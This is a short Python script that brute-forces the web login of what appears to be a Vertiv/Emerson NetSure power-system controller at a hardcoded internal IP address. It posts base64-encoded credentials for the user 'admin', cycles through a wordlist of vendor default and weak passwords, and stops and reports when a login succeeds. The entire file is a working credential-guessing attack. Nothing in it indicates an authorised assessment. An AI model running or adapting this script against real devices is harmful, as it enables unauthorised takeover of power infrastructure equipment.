import urllib.request
import urllib.parse
import base64
import time
import json
import sys

sys.stdout.reconfigure(encoding='utf-8')

def test_login(ip, username, password):
    url = f"http://{ip}/app/www_user/html/cgi-bin/web_cgi_main.cgi?_={int(time.time()*1000)}"
    u_b64 = base64.b64encode(username.encode()).decode()
    p_b64 = base64.b64encode(password.encode()).decode()
    post_data = f"user_name={u_b64}&user_password={p_b64}".encode('utf-8')
    
    req = urllib.request.Request(url, data=post_data, headers={
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    })
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode('utf-8-sig', errors='ignore').strip()
            try:
                res = json.loads(body)
                st = res.get('status')
                if st == 1:
                    print(f"SUCCESS! {username}:{password} -> {body}")
                    return True
                else:
                    print(f"Failed {username}:{password} -> status {st}")
            except Exception as e:
                print(f"JSON parse error for {password}: {e}")
    except Exception as e:
        print(f"Error {password} -> {e}")
    return False

passwords = [
    "admin123",
    "Admin123",
    "admin1234",
    "Admin1234",
    "password",
    "Password",
    "12345678",
    "111111",
    "000000",
    "640101",
    "640201",
    "vertiv",
    "Vertiv",
    "vertiv123",
    "Vertiv123",
    "emerson",
    "Emerson",
    "emerson123",
    "Emerson123",
    "netsure",
    "NetSure",
    "m830b",
    "M830B",
    "ncu",
    "NCU",
    "mea",
    "MEA",
    "mea1234",
    "meaadmin",
    "Mea@1234",
    "1",
    "",
]

for p in passwords:
    if test_login("10.209.30.21", "admin", p):
        break
    time.sleep(0.3)
